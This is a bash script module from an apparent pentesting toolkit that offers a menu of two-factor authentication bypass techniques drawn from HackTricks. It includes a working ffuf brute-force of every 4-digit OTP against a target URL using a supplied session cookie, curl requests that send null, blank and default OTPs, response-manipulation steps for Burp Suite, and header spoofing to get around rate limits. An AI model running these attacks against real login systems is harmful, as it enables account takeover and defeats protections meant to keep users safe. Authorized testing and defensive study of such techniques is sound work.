#!/bin/bash
# HackTricks Ref: 2fa-bypass.md
# Module: 2FA/MFA/OTP Bypass Tool

echo -e "${C6}[WEB ATTACK: 2FA_BYPASS]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/2fa-mfa-otp-bypass"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Bypass Technique to Execute/View:${NC}"
echo "1) Response Manipulation (401 -> 200 OK)"
echo "2) Common OTP Brute-Force (using ffuf)"
echo "3) Leakage Check (Check JS/Cookies for OTP)"
echo "4) Null/Default OTP Test (0000, 1234, null)"
echo "5) IP/Header Spoofing (X-Forwarded-For)"
echo "0) Exit to Menu"

read -p "Selection: " choice

case $choice in
    1)
        echo -e "\n${C2}[!] Methodology:${NC}"
        echo "1. Intercept the 2FA verify request in Burp Suite."
        echo "2. Right-click -> Do intercept -> Response to this request."
        echo "3. Change 'HTTP/1.1 401 Unauthorized' to 'HTTP/1.1 200 OK'."
        echo "4. Change JSON body: {\"success\":false} to {\"success\":true}."
        ;;
    2)
        read -p "Enter Target URL (e.g., http://site.com/api/verify): " target
        read -p "Enter Session Cookie: " cookie
        echo -e "${C4}[*] Starting ffuf brute-force on 4-digit OTP...${NC}"
        # Generează o listă rapidă de 4 cifre dacă nu există
        seq -w 0000 9999 > /tmp/otp_list.txt
        ffuf -u "$target" -X POST -d "otp=FUZZ" -H "Cookie: $cookie" -w /tmp/otp_list.txt -mc 200,302
        ;;
    3)
        echo -e "\n${C2}[*] Manual Check:${NC}"
        echo " - Inspect 'Network' tab for background API calls."
        echo " - Check if the OTP is reflected in a Set-Cookie header."
        echo " - Check local storage/session storage for 'otp' or 'code' keys."
        ;;
    4)
        read -p "Target URL: " target
        echo -e "${C4}[*] Testing Null/Blank/Default OTPs...${NC}"
        curl -X POST "$target" -d "otp=" -i
        curl -X POST "$target" -d "otp[]=null" -i
        curl -X POST "$target" -d "otp=0000" -i
        ;;
    5)
        echo -e "\n${C2}[*] Header Spoofing to bypass Rate Limits:${NC}"
        echo "Add these headers to your request:"
        echo "X-Forwarded-For: 127.0.0.1"
        echo "X-Originating-IP: 127.0.0.1"
        echo "X-Remote-IP: 127.0.0.1"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
